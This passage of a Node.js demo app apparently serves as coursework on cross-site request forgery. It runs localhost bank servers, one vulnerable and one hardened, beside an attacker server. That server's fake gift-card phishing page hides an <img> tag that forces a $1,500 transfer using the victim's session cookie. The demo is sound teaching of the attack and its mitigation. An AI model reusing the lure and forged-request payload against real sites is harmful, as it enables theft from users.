            <p style="font-size: 12px; color: #94a3b8; margin-top: 10px;">
                <strong>Attack Mechanism:</strong> When the logged-in victim visits the attacker's lure page, the victim's browser attempts to render the &lt;img&gt; tag, automatically transmitting the victim's session cookie cross-origin to the bank.
            </p>
        </div>

        <!-- Attack Delivery Targets -->
        <div class="panel">
            <div class="panel-title">
                <span>Phase 2: Delivery & Exploitation Triggers</span>
            </div>
            
            <div class="target-card vuln">
                <div style="font-weight: 700; color: #ef4444; font-size: 14px;">TARGET A: Port 3001 (Vulnerable Instance)</div>
                <div style="font-size: 12px; color: #cbd5e1; margin: 6px 0;">
                    Unprotected endpoint. Accepts state-changing GET requests without CSRF verification.
                </div>
                <div style="display: flex; gap: 10px; margin-top: 10px;">
                    <a href="/trap?targetPort=3001" target="_blank" class="btn btn-danger">🚨 Open Phishing Trap (Attacks Port 3001)</a>
                    <a href="http://localhost:3001" target="_blank" class="btn btn-outline">View Bank Dashboard (3001)</a>
                </div>
            </div>

            <div class="target-card hardened">
                <div style="font-weight: 700; color: #10b981; font-size: 14px;">TARGET B: Port 3002 (Hardened Instance)</div>
                <div style="font-size: 12px; color: #cbd5e1; margin: 6px 0;">
                    Hardened endpoint. Strictly rejects state-changing GETs (405) and enforces POST + Anti-CSRF Token.
                </div>
                <div style="display: flex; gap: 10px; margin-top: 10px;">
                    <a href="/trap?targetPort=3002" target="_blank" class="btn btn-danger" style="background: #047857;">🛡️ Open Phishing Trap (Attacks Port 3002)</a>
                    <a href="http://localhost:3002" target="_blank" class="btn btn-outline" style="border-color: #10b981; color: #10b981;">View Bank Dashboard (3002)</a>
                </div>
            </div>

            <div style="margin-top: 12px; font-size: 12px; color: #64748b;">
                💡 <strong>Demonstration Strategy:</strong> First attack Port 3001 and observe Alice's balance decrease by $1,500. Then attack Port 3002 to prove the exact same payload is blocked.
            </div>
        </div>

        <!-- Telemetry Logs -->
        <div class="panel full">
            <div class="panel-title">
                <span>Phase 3: Real-Time Adversary Telemetry & Click Tracker</span>
                <span style="font-size: 12px; color: #94a3b8; font-family: monospace;">Live Event Stream</span>
            </div>
            <table>
                <thead>
                    <tr style="border-bottom: 2px solid #1e293b; font-size: 11px; color: #64748b; text-align: left;">
                        <th style="padding: 8px;">TIMESTAMP</th>
                        <th style="padding: 8px;">LEVEL</th>
                        <th style="padding: 8px;">TELEMETRY EVENT</th>
                    </tr>
                </thead>
                <tbody>
                    ${telemetryRows}
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>
    `);
});

// The Phishing Trap Page (The Malicious Website visited by Victim Alice)
appAttacker.get('/trap', (req, res) => {
    const targetPort = req.query.targetPort || '3001';
    const amount = '1500.00';
    const recipient = 'mallory';
    const targetUrl = `http://localhost:${targetPort}/api/transfer?recipient=${recipient}&amount=${amount}`;

    logAttackerEvent(`Victim navigated to phishing lure page targeting Bank on Port ${targetPort}. Dispatching GET payload...`, 'ATTACK');

    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>🎉 Congratulations! Free $500 Amazon Gift Card Claim Portal</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; padding: 20px; }
        .card { background: white; border-radius: 12px; max-width: 600px; width: 100%; padding: 36px; text-align: center; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.2); }
        .badge { background: #fef08a; color: #854d0e; padding: 6px 14px; border-radius: 20px; font-weight: 700; font-size: 13px; display: inline-block; margin-bottom: 16px; }
        h1 { color: #1e1b4b; font-size: 26px; margin-bottom: 12px; }
        p { color: #475569; font-size: 15px; margin-bottom: 24px; line-height: 1.5; }
        .btn-claim { background: #f97316; color: white; font-weight: 800; font-size: 16px; padding: 14px 28px; border-radius: 8px; text-decoration: none; display: inline-block; box-shadow: 0 4px 6px rgba(249, 115, 22, 0.4); }
        .exploit-explanation { margin-top: 30px; text-align: left; background: #0f172a; color: #e2e8f0; padding: 18px; border-radius: 8px; font-size: 12px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="card">
        <span class="badge">🎁 PROMOTIONAL REWARD SELECTION</span>
        <h1>You Won a $500 TechFest Gift Card!</h1>
        <p>
            Congratulations! Your IP address was selected as today's campus winner. 
            Click the claim button below to receive your voucher code immediately.
        </p>

        <a href="#" class="btn-claim" onclick="alert('Thank you! Your promotional code has been sent.'); return false;">
            🎁 CLAIM MY $500 REWARD NOW
        </a>

        <!-- ================================================================================= -->
        <!-- RUBRIC ITEM (b): WORKING EXPLOIT PAYLOAD (GET-BASED FORGED ACTION)                -->
        <!-- A hidden subresource <img> tag that forces the victim's browser to execute        -->
        <!-- a forged GET request to the target bank while sending ambient session cookies.    -->
        <!-- ================================================================================= -->
        <img src="${targetUrl}" 
             alt="Promotional Tracker Pixel" 
             style="display: none;" 
             onload="reportStatus('SUCCESS: Bank executed transfer (or accepted request)')"
             onerror="reportStatus('FAILED/BLOCKED: Bank rejected GET request (Mitigation Active)')" />

        <div class="exploit-explanation">
            <strong style="color: #38bdf8;">[ACADEMIC CSRF DEMONSTRATION EXPLANATION]</strong><br>
            While you see a fake promotional banner, your browser secretly processed this hidden payload in the background:<br><br>
            <span style="color: #f43f5e;">&lt;img src="${targetUrl}" style="display:none;" /&gt;</span><br><br>
            • <strong>Target Port:</strong> ${targetPort}<br>
            • <strong>Browser Payload Outcome:</strong> <span id="status-text" style="color: #facc15; font-weight: bold;">Transmitting request...</span><br><br>
            <a href="http://localhost:${targetPort}" target="_blank" style="color: #38bdf8; text-decoration: underline;">
                Click here to view Port ${targetPort} Bank Dashboard to verify balance change!
            </a>
        </div>
    </div>

    <script>
        function reportStatus(msg) {
            document.getElementById('status-text').innerText = msg;
            fetch('/api/telemetry', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ event: 'Victim browser triggered payload against Port ${targetPort}: ' + msg, status: msg.includes('SUCCESS') ? 'SUCCESS' : 'BLOCKED' })
            }).catch(() => {});
        }
    </script>
</body>
</html>
    `);
});

// Telemetry endpoint for the lure page
appAttacker.post('/api/telemetry', (req, res) => {
    const { event, status } = req.body;
    logAttackerEvent(event || 'Unknown event received', status || 'INFO');
    res.json({ ok: true });
});


// =========================================================================================
// SERVER STARTUP & CONCURRENT LISTENING
// =========================================================================================
const PORT_ATTACKER = 4000;
const PORT_VULN = 3001;
const PORT_HARDENED = 3002;

appAttacker.listen(PORT_ATTACKER, () => {
    console.log(`[+] SIDE 1: Attacker Platform listening on http://localhost:${PORT_ATTACKER}`);
});

appVuln.listen(PORT_VULN, () => {
    console.log(`[+] SIDE 2A: Target Bank (VULNERABLE) listening on http://localhost:${PORT_VULN}`);
});

appHardened.listen(PORT_HARDENED, () => {
    console.log(`[+] SIDE 2B: Target Bank (HARDENED) listening on http://localhost:${PORT_HARDENED}`);
    console.log(`=================================================================================`);
    console.log(`All three environments are running concurrently!`);
    console.log(`1. Target Bank (Vulnerable): http://localhost:3001`);
    console.log(`2. Target Bank (Hardened):   http://localhost:3002`);
    console.log(`3. Attacker Console:         http://localhost:4000`);
    console.log(`=================================================================================`);
});
